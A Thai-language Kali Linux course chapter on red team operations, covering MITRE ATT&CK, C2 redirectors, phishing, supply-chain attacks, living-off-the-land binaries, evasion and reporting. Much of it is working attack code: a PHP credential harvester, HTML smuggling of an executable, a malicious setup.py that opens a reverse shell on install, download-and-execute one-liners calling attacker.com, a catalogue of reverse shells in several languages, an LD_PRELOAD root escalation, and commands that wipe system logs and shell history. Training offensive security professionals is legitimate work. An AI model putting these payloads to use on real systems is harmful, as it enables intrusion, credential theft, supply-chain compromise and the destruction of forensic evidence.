# Part 50: Red Team Operations

> **หลักสูตร Kali Linux จาก Zero ถึง Professional**  
> Part 50 of 100+ | ระดับ: Professional/World-Class

---

## สารบัญ

1. [Red Team คืออะไร](#1-red-team)
2. [MITRE ATT&CK Framework](#2-mitre-attck)
3. [Red Team Infrastructure](#3-infrastructure)
4. [Initial Access Techniques](#4-initial-access)
5. [C2 Frameworks ขั้นสูง](#5-c2-frameworks)
6. [Living Off the Land](#6-lotl)
7. [Stealth และ Opsec](#7-opsec)
8. [Red Team Report](#8-reporting)
9. [แบบฝึกหัด Lab](#9-lab)

---

## 1. Red Team คืออะไร

### 1.1 ความแตกต่าง Red/Blue/Purple Team

```
┌────────────────────────────────────────────────────────────┐
│  RED TEAM    = ฝ่ายโจมตี (จำลอง attacker)            │
│  BLUE TEAM   = ฝ่ายรับมือ (ทีมป้องกันภายใน)         │
│  PURPLE TEAM = ร่วมกันเพื่อผลวิจัยและปรับปรุง       │
├────────────────────────────────────────────────────────────┤
│  Pentest vs Red Team:                                   │
│  Pentest: หาช่องโหว่  แจ้ง ปิด
  ช่องโหว่        │
│  Red Team: จำลอง APT เต็มรูปแบบ (stealth, เวลาหลายสัปดาห์)│
└────────────────────────────────────────────────────────────┘

Red Team Objectives:
  - ผ่าน perimeter โดยไม่ถูกตรวจจับ
  - Maintain persistence อย่างยั่งยืน
  - Exfiltrate crown jewels (critical data)
  - นำเสนอผล พร้อม lessons learned
```

### 1.2 Rules of Engagement (ROE)

```
ก่อนเริ่ม Red Team engagement ต้องมี:

1. Written Authorization
   - ระบุ scope สิ่งที่ทำได้/ไม่ได้
   - IP ranges ที่อนุญาต
   - ช่วงเวลาสอบ
   - Emergency contacts

2. Deconfliction
   - IPs ของ Red Team
   - VPN credentials
   - Kill switch conditions

3. Emergency Stop
   - หากมี real incident ที่ไม่ใช่โดย Red Team
   - ต้องหยุดทันที
```

---

## 2. MITRE ATT&CK Framework

### 2.1 Tactics หลัก

```
TA0001: Initial Access
  T1566 - Phishing
  T1190 - Exploit Public-Facing Application
  T1133 - External Remote Services
  T1078 - Valid Accounts

TA0002: Execution
  T1059 - Command and Scripting Interpreter
  T1053 - Scheduled Task/Job
  T1203 - Exploitation for Client Execution

TA0003: Persistence
  T1547 - Boot/Logon Autostart
  T1543 - Create/Modify System Process
  T1098 - Account Manipulation

TA0004: Privilege Escalation
  T1548 - Abuse Elevation Control
  T1134 - Access Token Manipulation
  T1055 - Process Injection

TA0005: Defense Evasion
  T1027 - Obfuscated Files/Info
  T1562 - Impair Defenses
  T1070 - Indicator Removal

TA0006: Credential Access
  T1003 - OS Credential Dumping
  T1110 - Brute Force
  T1557 - Adversary-in-the-Middle

TA0007: Discovery
  T1087 - Account Discovery
  T1083 - File and Directory Discovery
  T1046 - Network Service Discovery

TA0008: Lateral Movement
  T1021 - Remote Services
  T1091 - Removable Media
  T1550 - Use Alternate Auth Material

TA0009: Collection
  T1005 - Data from Local System
  T1039 - Data from Network Shared Drive
  T1113 - Screen Capture

TA0010: Exfiltration
  T1041 - Exfiltration Over C2 Channel
  T1048 - Exfiltration Over Alt Protocol
  T1052 - Exfiltration Over Physical Medium

TA0011: Command and Control
  T1071 - Application Layer Protocol
  T1095 - Non-Application Layer Protocol
  T1132 - Data Encoding
```

### 2.2 ATT&CK Navigator

```bash
# ใช้ ATT&CK Navigator เพื่อ map techniques
# https://mitre-attack.github.io/attack-navigator/

# Atomic Red Team - test ATT&CK techniques
git clone https://github.com/redcanaryco/atomic-red-team
cd atomic-red-team

# รัน atomic test สำหรับ technique
# T1059.001 - PowerShell
# Invoke-AtomicTest T1059.001

# Python ATT&CK library
pip3 install mitreattack-python

python3 << 'EOF'
from mitreattack.stix20 import MitreAttackData

mad = MitreAttackData('enterprise-attack.json')
techniques = mad.get_techniques(remove_revoked_deprecated=True)

print(f"Total techniques: {len(techniques)}")
for t in techniques[:5]:
    tid = t.get('external_references', [{}])[0].get('external_id', 'N/A')
    name = t.get('name', 'N/A')
    print(f"  {tid}: {name}")
EOF
```

---

## 3. Red Team Infrastructure

### 3.1 โครงสร้าง Infrastructure

```
Red Team Infrastructure:
┌─────────────────────────────────────────────────────────┐
│  Redirectors → C2 Server → Internal pivot            │
│                                                       │
│  [Target] ────► [Redirector] ───► [C2 Server]      │
│                  (cloud VM)        (hidden)           │
│                  port 443/80                          │
│                                                       │
│  Benefits:                                            │
│  - ซ่อน true C2 IP                               │
│  - Block-list resilient (เปลี่ยน redirector ได้)  │
│  - Team server อยู่แยกจาก traffic            │
└─────────────────────────────────────────────────────────┘
```

### 3.2 ตั้งค่า Redirector

```bash
# Apache mod_rewrite redirector
# ติดตั้ง Apache
sudo apt install apache2 -y
sudo a2enmod rewrite proxy proxy_http ssl headers

# สร้าง config
cat > /etc/apache2/sites-available/redirector.conf << 'EOF'
<VirtualHost *:443>
    ServerName redirector.example.com
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/ssl-cert.pem
    SSLCertificateKeyFile /etc/ssl/private/ssl-key.pem
    
    RewriteEngine On
    
    # Block known security scanners
    RewriteCond %{HTTP_USER_AGENT} (curl|python|scanner|nikto) [NC]
    RewriteRule ^.*$ - [F,L]
    
    # Block security company IPs
    RewriteCond %{REMOTE_ADDR} ^(1\.2\.3\.)  
    RewriteRule ^.*$ - [F,L]
    
    # Only forward specific URIs (C2 traffic)
    RewriteCond %{REQUEST_URI} ^/(updates|stats|api/v2|health)
    RewriteRule ^/(.*)$ https://C2_SERVER_IP/$1 [P,L]
    
    # Everything else gets redirected to legitimate site
    RewriteRule ^.*$ https://www.microsoft.com/ [R=302,L]
</VirtualHost>
EOF

sudo a2ensite redirector.conf
sudo systemctl restart apache2

# Nginx redirector
cat > /etc/nginx/conf.d/redirector.conf << 'EOF'
server {
    listen 443 ssl;
    server_name redirector.example.com;
    
    ssl_certificate /etc/ssl/certs/ssl-cert.pem;
    ssl_certificate_key /etc/ssl/private/ssl-key.pem;
    
    location ~* ^/(updates|api/v2|health) {
        proxy_pass https://C2_SERVER_IP;
        proxy_set_header Host $host;
        proxy_ssl_verify off;
    }
    
    location / {
        return 302 https://www.microsoft.com;
    }
}
EOF
```

### 3.3 Domain Fronting และ CDN

```bash
# Domain Fronting ใช้ CDN ซ่อน C2 traffic
# (Cloudflare, AWS CloudFront, Azure CDN)

# AWS CloudFront setup:
# 1. สร้าง CloudFront distribution
# 2. Origin = C2 server
# 3. ใช้ HTTPS-only
# 4. Malleable C2 profile กำหนด Host header

# Cloudflare Workers redirector
cat > /tmp/worker.js << 'EOF'
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    // ตรวจสอบ URI path
    const allowedPaths = ['/updates', '/api/v2', '/health'];
    
    if (allowedPaths.some(p => url.pathname.startsWith(p))) {
      // Forward to C2
      const c2Url = `https://C2_SERVER${url.pathname}${url.search}`;
      return fetch(c2Url, {
        method: request.method,
        headers: request.headers,
        body: request.body
      });
    }
    
    // Decoy response
    return new Response('Not Found', { status: 404 });
  }
};
EOF
# Deploy ผ่าน wrangler CLI
```

---

## 4. Initial Access Techniques

### 4.1 Spear Phishing ขั้นสูง

```bash
# GoPhish setup (ดู Part 43)
# แบบที่นิยมใน Red Team:

# 1. Clone legitimate login page
sudo apt install httrack -y
httrack https://mail.company.com -O /var/www/html/phish/ \
    -T "+*.company.com*" -T "-*mailto*"

# 2. Add credential harvester
cat > /var/www/html/phish/harvest.php << 'EOF'
<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Log credentials
$log = "$timestamp | $ip | $username | $password\n";
file_put_contents('/tmp/creds.log', $log, FILE_APPEND);

// Send to attacker
// mail('attacker@example.com', 'Credentials', $log);

// Redirect to real site
header('Location: https://mail.company.com/?error=invalid');
EOF

# 3. HTML smuggling (bypass email gateway)
cat > /tmp/smuggle.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<script>
// Encode payload เป็น Base64
var b64 = 'TVpQAAIAAAAEAAAI...';
var binary = atob(b64);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'document.exe';
a.click();
</script>
<p>Loading document, please wait...</p>
</body>
</html>
EOF
```

### 4.2 Watering Hole Attack

```bash
# จำลอง watering hole:
# 1. หาเว็บไซต์ที่ target ชอบเข้า
# 2. เพิ่ม malicious script ในเว็บไซต์
# 3. รอ target เข้า → exploit browser

# BeEF XSS Framework
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef
# Web UI: http://localhost:3000/ui/panel

# Hook script ใน victim site:
# <script src="http://ATTACKER:3000/hook.js"></script>

# จาก BeEF panel:
# - ดูได้ว่าใครเข้า site
# - รัน commands: screenshot, credentials, redirect
# - Browser exploitation modules
```

### 4.3 Supply Chain Attacks

```bash
# Dependency Confusion
# ถ้าบริษัทใช้ internal package 'company-utils'
# สร้าง public package ชื่อเดียวกันบน PyPI/npm ด้วยเวอร์ชันสูงกว่า

# pip install จะเลือก public package แทน

# สร้าง malicious package
mkdir company-utils
cat > company-utils/setup.py << 'EOF'
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        # Execute on install
        subprocess.Popen(['python3', '-c', 
            'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));\n'
            'subprocess.call(["/bin/sh"],stdin=s,stdout=s,stderr=s)'])

setup(
    name='company-utils',
    version='9.9.9',  # เวอร์ชันสูงกว่า internal
    cmdclass={'install': PostInstall},
)
EOF

# Typosquatting (npm)
# requests → request (typo)
# lodash → 1odash, l0dash
```

---

## 5. C2 Frameworks ขั้นสูง

### 5.1 Cobalt Strike แนวทาง

```bash
# Cobalt Strike (commercial, $5900/year)
# ใช้โดย Red Team professionals

# Beacon commands:
# sleep 60 5     - beacon ทุก 60 วินาที +-5% jitter
# shell cmd.exe /c whoami
# powershell-import script.ps1
# psinject 1234  - inject PS ใน process
# spawnto x64 C:\Windows\System32\calc.exe
# jump psexec64 TARGET cmd.exe
# dcsync DOMAIN krbtgt

# Malleable C2 profile เพื่อ camouflage traffic
cat > /tmp/malleable_c2.profile << 'EOF'
set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/jquery-3.3.1.slim.min.js";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Referer" "https://code.jquery.com";
        metadata {
            base64url;
            parameter "__cfduid";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        header "Cache-Control" "max-age=0";
        output {
            prepend "!function(n,i){var a,e,o,t=n.getElementsByTagName";
            base64;
            print;
        }
    }
}
EOF
```

### 5.2 Sliver C2

```bash
# Sliver (Open Source alternative to Cobalt Strike)
git clone https://github.com/BishopFox/sliver
cd sliver
make

# หรือดาวน์โหลดที่เตรียมแล้ว
curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux > sliver-server
chmod +x sliver-server

# เริ่ม server
./sliver-server

# Sliver console commands:
# mtls --lport 443                     # start listener
# generate --mtls 10.10.10.1 --os windows --arch amd64  # create implant
# sessions                             # ดู sessions
# use SESSION_ID                       # เลือก session
# shell                                # interactive shell
# upload local.txt remote.txt         # upload
# download remote.txt local.txt       # download
# execute -t 60 whoami                # run command
# getsystem                            # priv esc
# pivots tcp                           # create pivot

# หรือใช้ Havoc C2 (newer, more features)
```

### 5.3 Havoc C2

```bash
# Havoc C2 Framework
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make

# เริ่ม team server
./havoc server --profile ./profiles/havoc.yaotl

# เริ่ม client UI
./havoc client

# Havoc features:
# - Demon implant (พัฒนาที่ใน C)
# - Process injection
# - Token impersonation
# - BOF (Beacon Object Files)
# - Python/Powershell execution
# - Sleep obfuscation (Ekko, FOLIAGE)

# สร้าง payload
# Listener: HTTPS port 443
# Generate Demon payload (.exe, .dll, shellcode)
```

---

## 6. Living Off the Land

### 6.1 LOLBins (Windows)

```bash
# Living-off-the-Land Binaries
# ใช้เครื่องมือของ Windows เองเพื่อ malicious action
# หลีก AV detection

# certutil - download file
certutil -urlcache -f http://attacker.com/payload.exe C:\temp\payload.exe
certutil -encode payload.exe payload.b64      # encode
certutil -decode payload.b64 payload.exe      # decode

# bitsadmin - background download
bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe

# PowerShell (many methods)
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
powershell -EncodedCommand BASE64_ENCODED_COMMAND

# wmic - execute
wmic process call create "cmd.exe /c whoami > C:\temp\out.txt"

# regsvr32 - execute DLL/COM
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# mshta - execute HTA
mshta http://attacker.com/payload.hta
mshta vbscript:Execute("CreateObject('WScript.Shell').Run('cmd.exe')")

# rundll32 - execute DLL
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://attacker.com/payload.sct")

# cmstp - UAC bypass
# forfiles - execute via search results
# pcalua - Program Compatibility Assistant
pcalua -a cmd.exe -c /k whoami
```

### 6.2 LOLBins (Linux)

```bash
# Linux LOLBins
# https://gtfobins.github.io/

# Reverse shells ผ่าน common binaries

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh ATTACKER 4444
nc ATTACKER 4444 | /bin/bash | nc ATTACKER 4445  # ถ้าไม่มี -e flag

# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# wget reverse shell
wget -O - http://attacker.com/shell.sh | bash

# curl execute
curl http://attacker.com/shell.sh | bash

# PHP
php -r '$s=fsockopen("ATTACKER",4444);proc_open("/bin/sh",array($s,$s,$s),$p);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# Ruby
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# LD_PRELOAD privilege escalation
cat > /tmp/priv.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/priv.so /tmp/priv.c
sudo LD_PRELOAD=/tmp/priv.so program_that_allows_env
```

---

## 7. Stealth และ Opsec

### 7.1 Operational Security

```bash
# OPSEC สำหรับ Red Team

# 1. ใช้ HTTPS/TLS สำหรับ C2
# 2. Rotate infrastructure สม่ำเสมอ
# 3. ไม่ใช้ C2 URL ซ้ำ
# 4. Jitter ใน sleep time
# 5. ส่ง traffic ในช่วง business hours
# 6. จำลอง legitimate software behavior

# C2 Profile เลียนแบบ legitimate traffic
# - Microsoft Teams รูปแบบ
# - Slack รูปแบบ
# - Office 365 รูปแบบ

# Timestamp ซ่อน beacon activity ใน business hours
cat > /tmp/business_hours.py << 'EOF'
from datetime import datetime
import time

def is_business_hours():
    now = datetime.now()
    # Mon-Fri, 8AM-6PM
    return (now.weekday() < 5 and 8 <= now.hour < 18)

while True:
    if is_business_hours():
        # check in with C2
        print(f"[{datetime.now()}] Checking in...")
    
    # sleep with jitter
    import random
    sleep_time = 30 + random.randint(-5, 5)  # 25-35 seconds
    time.sleep(sleep_time)
EOF

# Process injection เพื่อซ่อนใน legitimate process
# - svchost.exe
# - explorer.exe
# - notepad.exe
# - msedge.exe
```

### 7.2 Timestomping และ Log Manipulation

```bash
# ลบรอยเท้า (covering tracks)

# Timestomping - เปลี่ยน timestamp
# Linux
touch --reference=/bin/ls /tmp/malware.sh
touch -t 202301011200 suspicious_file

# Windows PowerShell
$file = Get-Item 'C:\temp\malware.exe'
$file.LastWriteTime = (Get-Date '2023-01-01 12:00:00')
$file.LastAccessTime = (Get-Date '2023-01-01 12:00:00')
$file.CreationTime = (Get-Date '2023-01-01 12:00:00')

# Clear Linux logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cleartmp  # clear /tmp

# Clear specific entries
sed -i '/192.168.1.100/d' /var/log/auth.log
sed -i "/$(date '+%b %d')/d" /var/log/syslog

# Clear bash history
unset HISTFILE
export HISTSIZE=0
history -c
history -w
kill -9 $$  # kill shell without writing history

# Windows - clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath

# Scheduled task cleanup
schTasks /delete /tn "UpdateTask" /f
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /f
```

---

## 8. Red Team Report

### 8.1 โครงสร้าง Report

```markdown
# Red Team Assessment Report

## Executive Summary
- สรุปผลสำหรับผู้บริหาร
- คะแนนความเสี่ยง: Critical/High/Medium/Low
- Timeline
- สิ่งที่ประสบความสำเร็จ

## Technical Narrative (Attack Story)
- Initial Access: Phishing → User X clicked link
- Foothold: Meterpreter session
- Lateral Movement: Pass-the-Hash → DC
- Objectives: Exfiltrated database

## Findings
| ID | Severity | Title | CVSS |
|----|----------|-------|------|
| 1  | Critical | SQL Injection | 9.8 |
| 2  | High | Weak AD Config | 8.1 |

## Attack Timeline
| Time | Action | Host | Account |
|------|--------|------|--------|
| T+0  | Phish sent | - | - |
| T+2h | Shell obtained | WS01 | jdoe |
| T+4h | Admin gained | DC01 | admin |

## Recommendations
1. Critical (fix within 30 days): Patch SQL injection
2. High (fix within 90 days): Enable MFA
3. Medium: Security awareness training

## MITRE ATT&CK Mapping
| Technique | ID | Used |
|-----------|-----|------|
| Phishing | T1566 | Yes |
| PtH | T1550.002 | Yes |
```

### 8.2 Threat Intelligence Reporting

```python
#!/usr/bin/env python3
# generate_report.py - สร้าง Red Team report

import json
from datetime import datetime

class RedTeamReport:
    def __init__(self, client, scope, start_date, end_date):
        self.client = client
        self.scope = scope
        self.start_date = start_date
        self.end_date = end_date
        self.findings = []
        self.timeline = []
        self.techniques = []
    
    def add_finding(self, severity, title, description, cvss, remediation):
        self.findings.append({
            'id': len(self.findings) + 1,
            'severity': severity,
            'title': title,
            'description': description,
            'cvss': cvss,
            'remediation': remediation,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_timeline_event(self, time_offset, action, host, account, technique_id):
        self.timeline.append({
            'time_offset': time_offset,
            'action': action,
            'host': host,
            'account': account,
            'mitre_technique': technique_id
        })
    
    def export_json(self, filename):
        report = {
            'metadata': {
                'client': self.client,
                'scope': self.scope,
                'start_date': self.start_date,
                'end_date': self.end_date,
                'generated': datetime.now().isoformat()
            },
            'findings': sorted(self.findings, key=lambda x: {
                'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3
            }.get(x['severity'], 99)),
            'timeline': self.timeline
        }
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report exported: {filename}")

# สร้าง report
report = RedTeamReport(
    client='ACME Corp',
    scope='External + Internal',
    start_date='2024-01-15',
    end_date='2024-01-30'
)

report.add_finding(
    severity='Critical',
    title='SQL Injection in Login Portal',
    description='Authentication bypass via SQL injection',
    cvss=9.8,
    remediation='Use parameterized queries, WAF rules'
)

report.add_finding(
    severity='High',
    title='Kerberoasting - Weak Service Account Passwords',
    description='3 service accounts with crackable passwords',
    cvss=8.1,
    remediation='Implement Managed Service Accounts (MSA)'
)

report.add_timeline_event('T+0', 'Phishing email sent', 'N/A', 'N/A', 'T1566.001')
report.add_timeline_event('T+2h', 'User clicked link, shell obtained', 'WS01', 'jdoe', 'T1059.001')
report.add_timeline_event('T+4h', 'Privilege escalation', 'WS01', 'SYSTEM', 'T1548.002')
report.add_timeline_event('T+6h', 'Domain admin obtained', 'DC01', 'domainadmin', 'T1003.001')

report.export_json('/tmp/redteam_report.json')
```

---

## 9. แบบฝึกหัด Lab

### Lab 1: Mini Red Team Operation

```bash
# Scenario: External → Internal → Domain Admin
# (CTF/Lab environment only)

# Phase 1: Reconnaissance
nmap -sC -sV -oN initial_scan.txt TARGET
theHarvester -d target.com -b all -f osint_results.html

# Phase 2: Initial Access
# หา web app vulnerabilities
nmap --script http-vuln-* TARGET -p 80,443
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Phase 3: Establish Foothold
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ATTACKER; set LPORT 4444; run'

# Phase 4: Post-Exploitation
# meterpreter> sysinfo
# meterpreter> getuid
# meterpreter> load kiwi
# meterpreter> creds_all
# meterpreter> run post/windows/gather/enum_domain
# meterpreter> run post/multi/recon/local_exploit_suggester

# Phase 5: Lateral Movement
# impacket-psexec -hashes :HASH domain/admin@TARGET cmd.exe

# Phase 6: Domain Admin
# impacket-secretsdump -dc-ip DC_IP domain/admin:pass@DC_IP

# Phase 7: Objectives
# Demonstrate access to crown jewels
# Extract specific data as proof

# Phase 8: Report
python3 generate_report.py
```

### สรุป Red Team

```
Red Team Kill Chain:

  Reconnaissance
       ↓
  Initial Access (Phishing/Exploit/Supply Chain)
       ↓
  Foothold (C2 established)
       ↓
  Defense Evasion (LOLBins, Obfuscation)
       ↓
  Privilege Escalation
       ↓
  Credential Access
       ↓
  Lateral Movement (PtH, PtT, PSExec)
       ↓
  Persistence (Backdoors, Scheduled Tasks)
       ↓
  Exfiltration
       ↓
  Objectives Achieved → Report

เครื่องมือ:
  C2: Cobalt Strike, Sliver, Havoc, Metasploit
  Implants: Beacon, Demon, Meterpreter
  Frameworks: BloodHound, Impacket, PowerSploit
  Evasion: AV bypass, LOLBins, Obfuscation
  Infrastructure: Redirectors, Domain Fronting
```

---

**[← Part 49: Reverse Engineering](Part-49-Reverse-Engineering.md)** | **[→ Part 51: Threat Hunting](Part-51-Threat-Hunting.md)**
